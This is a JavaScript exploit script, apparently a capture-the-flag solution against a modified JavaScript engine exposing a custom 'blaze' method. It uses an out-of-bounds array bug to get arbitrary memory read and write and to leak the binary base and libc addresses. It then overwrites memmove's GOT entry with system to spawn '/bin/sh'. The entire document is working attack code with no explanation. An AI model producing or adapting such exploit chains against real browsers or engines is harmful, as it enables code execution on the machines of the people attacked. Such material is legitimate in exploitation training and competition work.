//double to int
function d_to_i2(d){
         var a = new Uint32Array(new Float64Array([d]).buffer);
         return [a[1], a[0]];
 }

//int to double
 function i2_to_d(x){
     return new Float64Array(new Uint32Array([x[1], x[0]]).buffer)[0];
 }

function i2_to_hex(i2){
                var v1 = ("00000000" + i2[0].toString(16)).substr(-8);
                var v2 = ("00000000" + i2[1].toString(16)).substr(-8);
         return [v1,v2];
 }
 function p_i2(d){
        return i2_to_hex(d_to_i2(d))[0]+i2_to_hex(d_to_i2(d))[1];
 
 }

function debug_log(x){
        return console.log("[DEBUG] "+x)
}

function hex(i2){
  return "0x" + ("00000000" + i2[0].toString(16)).slice(-8) + ("00000000" + i2[1].toString(16)).slice(-8);
}

var arr = new Array(3);
arr[0] = 0x41414141;
arr[1] = 0x42424242;
arr[2] = 0x43434343;

var uInt32_arr = new Uint32Array(0x100);

for(var i=0; i < 0x100 ; i++) {
	uInt32_arr[i] = 0x44444444;
}

uInt32_arr.copyWithin(3, 1, 3);					// This is just to initialize "memmove"

arr.blaze();

var uInt32_arr_data_pointer_index = 13;				// This index is based on the content of "arr", it may varies.

console.log("[+] Uint32Arr data pointer address : " , p_i2(arr[uInt32_arr_data_pointer_index]) );

var emptyElementsHeader_index = uInt32_arr_data_pointer_index - 4

var emptyElementsHeader_address = arr[emptyElementsHeader_index];

var bin_base_offset_from_emptyElementsHeader = 0x1af81e0

console.log("[+] Empty elements headr address : " , p_i2(emptyElementsHeader_address) );

bin_base = d_to_i2(emptyElementsHeader_address)

bin_base[1] = bin_base[1] - bin_base_offset_from_emptyElementsHeader;

console.log("[+] Bin base address : ", i2_to_hex(bin_base)[0]+i2_to_hex(bin_base)[1] );


var memory = {
	read : function(addr) {
		arr[uInt32_arr_data_pointer_index] = i2_to_d(addr);
		return [uInt32_arr[1] , uInt32_arr[0]];
	},

	write: function(addr, data) {
		arr[uInt32_arr_data_pointer_index] = i2_to_d(addr);
		uInt32_arr[0] = data[1];
		uInt32_arr[1] = data[0];
	},

}






var fopen_got = [bin_base[0],(bin_base[1] + 0x2dd3060)];

var memmove_got = [bin_base[0],(bin_base[1] + 0x2dd3050)];

var system_offset_from_fopen = 0x289e0;


var fopen_libc = memory.read(fopen_got);
var memmove_libc = memory.read(memmove_got);
var system_libc = [fopen_libc[0],fopen_libc[1] - system_offset_from_fopen];

console.log("[+] fopen lib address : ", hex(fopen_libc) );

console.log("[+] memmove libc address : ", hex(memmove_libc))

console.log("[+] System libc address : ", hex(system_libc))


var target = new Uint8Array(100);
var cmd = "/bin/sh";
for (var i = 0; i < cmd.length; i++) {
	target[i] = cmd.charCodeAt(i);
}

memory.write(memmove_got,system_libc);
target.copyWithin(0,1);
memory.write(memmove_got,memmove_libc);

